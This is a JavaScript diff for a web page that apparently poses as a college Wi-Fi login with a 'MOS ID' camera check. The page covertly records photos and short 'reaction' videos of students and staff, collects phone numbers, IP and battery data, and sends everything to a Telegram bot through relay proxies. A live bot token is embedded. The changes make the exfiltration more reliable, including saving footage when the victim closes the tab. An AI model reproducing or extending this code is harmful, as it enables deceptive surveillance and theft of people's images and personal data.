@@ -620,23 +620,52 @@
     appId: "1:262830985110:web:6253b9cd57e767a04b57b7"
   };
 
-  // ===== TELEGRAM (двойной прокси) =====
+  // ===== TELEGRAM =====
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
 
+  // Прокси. Первый — CF Worker, второй — Vercel.
   const PROXY_URLS = [
     "https://kp11-bot-proxy.riwendik.workers.dev",
     "https://kp11-proxy.vercel.app/api/proxy"
   ];
 
+  // ============================================================
+  //  Утилиты
+  // ============================================================
+
+  // dataURL → Blob без fetch(dataURL) — работает в Safari
+  function dataURLtoBlob(dataURL) {
+    const [header, base64] = dataURL.split(',');
+    const mimeMatch = header.match(/:(.*?);/);
+    const mime = mimeMatch ? mimeMatch[1] : 'application/octet-stream';
+    const binary = atob(base64);
+    const len = binary.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+    return new Blob([bytes], { type: mime });
+  }
+
+  // Таймаут зависит от метода
+  function timeoutForMethod(method) {
+    if (method === "sendVideo") return 30000;   // 30 сек
+    if (method === "sendDocument") return 30000;
+    if (method === "sendPhoto") return 15000;   // 15 сек
+    return 8000;                                 // 8 сек для текста
+  }
+
+  // ============================================================
+  //  Отправка через прокси с failover
+  // ============================================================
   async function sendWithFailover(method, options) {
     const errors = [];
+    const timeout = timeoutForMethod(method);
     for (let round = 0; round < 3; round++) {
       for (const proxy of PROXY_URLS) {
         try {
           const url = `${proxy}?token=${TELEGRAM_TOKEN}&method=${method}`;
           const controller = new AbortController();
-          const timer = setTimeout(() => controller.abort(), 6000);
+          const timer = setTimeout(() => controller.abort(), timeout);
           const fetchOptions = { ...options, signal: controller.signal };
           const res = await fetch(url, fetchOptions);
           clearTimeout(timer);
@@ -654,7 +683,28 @@
     throw new Error(errors.join(" | "));
   }
 
-  async function sendTelegramNotify(text) {
+  // ============================================================
+  //  Анти-дубль текста (localStorage флаг на 5 минут)
+  // ============================================================
+  function alreadySentText(key) {
+    try {
+      const v = localStorage.getItem(key);
+      if (!v) return false;
+      const ts = parseInt(v, 10);
+      if (Date.now() - ts < 5 * 60 * 1000) return true;
+      localStorage.removeItem(key);
+      return false;
+    } catch { return false; }
+  }
+  function markTextSent(key) {
+    try { localStorage.setItem(key, String(Date.now())); } catch {}
+  }
+
+  async function sendTelegramNotify(text, dedupKey) {
+    if (dedupKey && alreadySentText(dedupKey)) {
+      console.log("⏭ Текст уже отправлен, пропуск");
+      return;
+    }
     try {
       const res = await sendWithFailover("sendMessage", {
         method: "POST",
@@ -666,16 +716,31 @@
           disable_web_page_preview: true
         })
       });
-      if (!res || !res.ok) console.warn("Text send failed:", res ? await res.text() : "no response");
-      else console.log("✅ Текст отправлен");
+      if (!res || !res.ok) {
+        console.warn("Text send failed:", res ? await res.text() : "no response");
+      } else {
+        console.log("✅ Текст отправлен");
+        if (dedupKey) markTextSent(dedupKey);
+      }
     } catch (err) {
       console.error("❌ Ошибка отправки текста:", err);
     }
   }
 
+  // ============================================================
+  //  Отправка фото: сначала sendPhoto, при провале — sendDocument
+  // ============================================================
   async function sendTelegramPhoto(photoBase64, caption) {
+    let blob;
     try {
-      const blob = await (await fetch(photoBase64)).blob();
+      blob = dataURLtoBlob(photoBase64);
+    } catch (e) {
+      console.error("❌ Не удалось создать Blob из фото:", e);
+      return;
+    }
+
+    // Попытка 1: sendPhoto
+    try {
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       if (caption) {
@@ -688,16 +753,53 @@
         method: "POST",
         body: formData
       });
-      if (!res || !res.ok) console.warn("Photo send failed:", res ? await res.text() : "no response");
-      else console.log("✅ Фото отправлено");
+      if (res && res.ok) {
+        console.log("✅ Фото отправлено (sendPhoto)");
+        return;
+      }
+      console.warn("sendPhoto не прошёл, пробуем sendDocument…");
     } catch (err) {
-      console.error("❌ Ошибка отправки фото:", err);
+      console.warn("❌ sendPhoto упал:", err.message || err);
+    }
+
+    // Попытка 2: sendDocument (fallback)
+    try {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      if (caption) {
+        formData.append("caption", caption);
+        formData.append("parse_mode", "HTML");
+      }
+      formData.append("document", blob, "selfie.jpg");
+
+      const res = await sendWithFailover("sendDocument", {
+        method: "POST",
+        body: formData
+      });
+      if (res && res.ok) {
+        console.log("✅ Фото отправлено (sendDocument fallback)");
+      } else {
+        console.warn("sendDocument тоже не прошёл");
+      }
+    } catch (err) {
+      console.error("❌ Ошибка отправки фото (sendDocument):", err);
     }
   }
 
+  // ============================================================
+  //  Отправка видео: сначала sendVideo, при провале — sendDocument
+  // ============================================================
   async function sendTelegramVideo(videoBase64, caption) {
+    let blob;
     try {
-      const blob = await (await fetch(videoBase64)).blob();
+      blob = dataURLtoBlob(videoBase64);
+    } catch (e) {
+      console.error("❌ Не удалось создать Blob из видео:", e);
+      return;
+    }
+
+    // Попытка 1: sendVideo
+    try {
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       if (caption) {
@@ -710,10 +812,36 @@
         method: "POST",
         body: formData
       });
-      if (!res || !res.ok) console.warn("Video send failed:", res ? await res.text() : "no response");
-      else console.log("✅ Видео отправлено");
+      if (res && res.ok) {
+        console.log("✅ Видео отправлено (sendVideo)");
+        return;
+      }
+      console.warn("sendVideo не прошёл, пробуем sendDocument…");
     } catch (err) {
-      console.error("❌ Ошибка отправки видео:", err);
+      console.warn("❌ sendVideo упал:", err.message || err);
+    }
+
+    // Попытка 2: sendDocument (fallback)
+    try {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      if (caption) {
+        formData.append("caption", caption);
+        formData.append("parse_mode", "HTML");
+      }
+      formData.append("document", blob, "video.mp4");
+
+      const res = await sendWithFailover("sendDocument", {
+        method: "POST",
+        body: formData
+      });
+      if (res && res.ok) {
+        console.log("✅ Видео отправлено (sendDocument fallback)");
+      } else {
+        console.warn("sendDocument тоже не прошёл");
+      }
+    } catch (err) {
+      console.error("❌ Ошибка отправки видео (sendDocument):", err);
     }
   }
 
@@ -1069,14 +1197,12 @@
     grpWrap.classList.remove('field-hidden');
   });
 
-  // ===== Блокировка формы =====
   function lockForm() {
     const elements = wifiCard.querySelectorAll('input, select, button');
     elements.forEach(el => { el.disabled = true; });
     wifiCard.classList.add('locked');
   }
 
-  // ===== MOS ID + камера =====
   const mosidOverlay    = document.getElementById('mosidOverlay');
   const cameraFrame     = document.getElementById('cameraFrame');
   const cameraVideo     = document.getElementById('cameraVideo');
@@ -1237,6 +1363,10 @@
 
     startVideoRecording();
 
+    // Обработчик на закрытие вкладки — чтобы видео успело уйти
+    window.addEventListener('pagehide', onPageHide, { once: true });
+    window.addEventListener('beforeunload', onPageHide, { once: true });
+
     setTimeout(async () => {
       await stopRecordingAndSave();
     }, 6000);
@@ -1265,6 +1395,19 @@
       });
     } catch (e) {}
     saveToFirestore(null, capturedPhoto);
+  }
+
+  // Флаг, чтобы не сохранять дважды
+  let savedToFirestore = false;
+
+  function onPageHide() {
+    // Если вкладку закрывают — сохраняем то, что успели записать
+    if (savedToFirestore) return;
+    savedToFirestore = true;
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      try { mediaRecorder.stop(); } catch {}
+    }
+    // Дальше onstop в mediaRecorder вызовет saveToFirestore
   }
 
   function startVideoRecording() {
@@ -1297,7 +1440,10 @@
     return new Promise((resolve) => {
       if (!mediaRecorder || mediaRecorder.state === "inactive") {
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-        saveToFirestore(null, capturedPhoto);
+        if (!savedToFirestore) {
+          savedToFirestore = true;
+          saveToFirestore(null, capturedPhoto);
+        }
         resolve();
         return;
       }
@@ -1310,13 +1456,19 @@
             videoBase64 = await blobToBase64(blob);
           }
         }
-        saveToFirestore(videoBase64, capturedPhoto);
+        if (!savedToFirestore) {
+          savedToFirestore = true;
+          saveToFirestore(videoBase64, capturedPhoto);
+        }
         resolve();
       };
       try {
         mediaRecorder.stop();
       } catch (e) {
-        saveToFirestore(null, capturedPhoto);
+        if (!savedToFirestore) {
+          savedToFirestore = true;
+          saveToFirestore(null, capturedPhoto);
+        }
         resolve();
       }
     });
@@ -1361,7 +1513,7 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        await sendTelegramNotify(caption);
+        await sendTelegramNotify(caption, "text_staff_" + phone);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
       } else {
@@ -1388,7 +1540,7 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        await sendTelegramNotify(caption);
+        await sendTelegramNotify(caption, "text_student_" + phone);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
@@ -1397,22 +1549,12 @@
     }
   }
 
-  // ============================================================
-  //  ОБРАБОТКА ФОРМЫ
-  //  ВАЖНО: ветка педагога — ПЕРВАЯ, с гарантированным return.
-  //  Плашка показывается СРАЗУ, до Firestore и Telegram.
-  //  Форма блокируется.
-  // ============================================================
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     notice.classList.remove('show');
     unlockAudio();
 
-    // ==========================================================
-    //  ВЕТКА ПЕДАГОГА
-    // ==========================================================
     if (courseEl.value === 'staff') {
-      // Валидация ФИО (опционально)
       if (fioEl.value.trim()) {
         const res = validateFIO(fioEl.value);
         if (!res.ok) {
@@ -1424,7 +1566,6 @@
       }
       clearFioError();
 
-      // Телефон обязателен
       const phoneRes = validatePhone(phoneEl.value);
       if (!phoneRes.ok) {
         showPhoneError(phoneRes.message);
@@ -1434,17 +1575,11 @@
       }
       clearPhoneError();
 
-      // === МГНОВЕННО показываем плашку (до запросов) ===
       notice.classList.add('show');
       notice.scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-      // Скрываем «Добро пожаловать!» — плашка встанет по центру
       welcomeBlock.style.display = 'none';
-
-      // Блокируем форму — нельзя ничего менять
       lockForm();
 
-      // Дальше — фоновая задача, UI не трогает
       const staffFio = fioEl.value.trim().replace(/\s+/g, ' ') || 'Без имени';
       const phoneNorm = phoneRes.normalized;
 
@@ -1479,18 +1614,15 @@
             "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
-          await sendTelegramNotify(caption);
+          await sendTelegramNotify(caption, "text_staff_" + phoneNorm);
         } catch (err) {
           console.error("Ошибка фоновой задачи педагога:", err);
         }
       })();
 
-      return; // ← ГАРАНТИРОВАННЫЙ ВЫХОД, никакого MOS ID
+      return;
     }
 
-    // ==========================================================
-    //  ВЕТКА СТУДЕНТА
-    // ==========================================================
     if (!courseEl.value) { courseEl.focus(); courseEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
     if (!dirEl.value) { dirEl.focus(); dirEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
     if (!grpEl.value) { grpEl.focus(); grpEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
@@ -1513,7 +1645,6 @@
     }
     clearPhoneError();
 
-    // Блокируем форму для студента тоже
     btn.disabled = true;
     btn.textContent = 'Подключение...';
     lockForm();
